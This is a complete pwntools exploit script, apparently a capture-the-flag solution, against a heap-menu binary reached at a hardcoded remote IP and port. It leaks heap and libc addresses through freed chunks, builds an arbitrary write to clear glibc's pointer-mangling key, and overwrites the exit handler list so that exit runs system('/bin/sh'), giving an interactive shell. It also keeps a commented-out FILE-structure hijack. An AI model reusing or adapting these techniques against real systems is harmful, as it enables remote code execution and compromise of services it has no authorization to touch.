from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./ll_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = '154.26.136.227'
port = 54838
cmd = f'''
    set solib-search-path {os.getcwd()}
    b exit
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

ADD_NUM = 1
DEL_NUM = 2
VIEW_NUM = 3
EDIT_NUM = 4
ADD_NAME = 5
DEL_NAME = 6

def check():
    chall.interactive()
    exit()

def _add_num(id, num, arr):
    _sendline(b'choice: ', str(ADD_NUM).encode())
    _sendline(b'ID: ', str(id).encode())
    _sendline(b'input? ', str(num).encode())
    for i in arr:
        chall.sendline(str(i).encode())

def _del_num(id):
    _sendline(b'choice: ', str(DEL_NUM).encode())
    _sendline(b'ID: ', str(id).encode())

def _view_num(id):
    _sendline(b'choice: ', str(VIEW_NUM).encode())
    _sendline(b'ID: ', str(id).encode())

def _edit_num(id, arr):
    _sendline(b'choice: ', str(EDIT_NUM).encode())
    _sendline(b'ID: ', str(id).encode())
    for i in arr:
        chall.sendline(str(i).encode())

def _add_name(idx, size, _data):
    _sendline(b'choice: ', str(ADD_NAME).encode())
    _sendline(b'Index: ', str(idx).encode())
    _sendline(b'Size: ', str(size).encode())
    chall.send(_data)

def _del_name(idx):
    _sendline(b'choice: ', str(DEL_NAME).encode())
    _sendline(b'Index: ', str(idx).encode())

def _aawrite(addr, _data, base, heap_base):
    arr = [0, 0x210]
    for i in range(8):
        arr.append(0x461)
    arr.append(libc.address + 0x203b20)
    arr.append(libc.address + 0x203b20)
    arr.append(0)
    arr.append(0)
    for i in range(63 - 14 + 1):
        arr.append(0x461)
    arr.append(0xff00000000)
    arr.append(0xff)
    for i in range(3):
        arr.append(0)
    arr.append(0x231)
    arr.append(addr ^ heap_base)
    for i in range(71, 134):
        arr.append(0xff)
    arr.append(0xff00000000)
    arr.append(base)
    for i in range(3):
        arr.append(0)
    arr.append(0x231)
    arr.append(2)
    arr.append(0x210)
    for i in range(142, 148):
        arr.append(0x21)
    arr.append(0x460)
    arr.append(0x20)
    for i in range(150, 204):
        arr.append(0x21)
    arr.append(0xff00000000)
    arr.append(base)
    for i in range(3):
        arr.append(0)
    arr.append(0x20051)
    for i in range(210, 255):
        arr.append(0)
    _edit_num(0, arr)

def main():
    arr = [1, 2]
    for i in range(3):
        _add_num(i, 2, arr)
    _del_num(1)
    _add_num(1, 2, arr)
    _del_num(2)
    _view_num(2)
    chall.recvuntil(b'0 is: ')
    heap = int(chall.recvline()[:-1].decode(), 16)
    log.info(f"Heap: {hex(heap)}")
    target = (heap << 12) + 0x980
    _add_name(0, 0x210, p(0x461) * 0x3e + p(0xff00000000) + p(target))
    _add_name(1, 0x210, p(0xff) * 0x3e + p(0xff00000000) + p(target))
    _add_name(2, 0x210, p(0x21) * 0x3e + p(0xff00000000) + p(target))
    _del_num(255)
    _del_num(0)
    _view_num(0)
    chall.recvuntil(b'10 is: ')
    libc.address = int(chall.recvline()[:-1], 16)  - 0x203b20
    log.info(f"Libc: {hex(libc.address)}")
    _del_name(1)
    _data = p(0)
    _key_str = libc.address - 0x28a0
    _aawrite(_key_str, _data, target, heap)
    _add_name(1, 0x210, p(0) + b'\n')
    _add_name(3, 0x210, p(0) * 3 + b'\n')
    _del_name(0)
    _del_name(1)
    _exitfuncs = libc.address + 0x204fb0
    _aawrite(_exitfuncs, _data, target, heap)
    key = 0
    _add_name(1, 0x210, p(0) + b'\n')
    _add_name(0, 0x210, p(0) + p(1) + p(4) + encrypt(libc.sym['system'], key) + p(next(libc.search(b'/bin/sh')))  +  p(0) + p(0) + b'\n')
    _sendline(b'choice: ', str(ADD_NAME).encode())
    _sendline(b'Index: ', b'6\n')
    check()

if __name__ == "__main__":
    main()
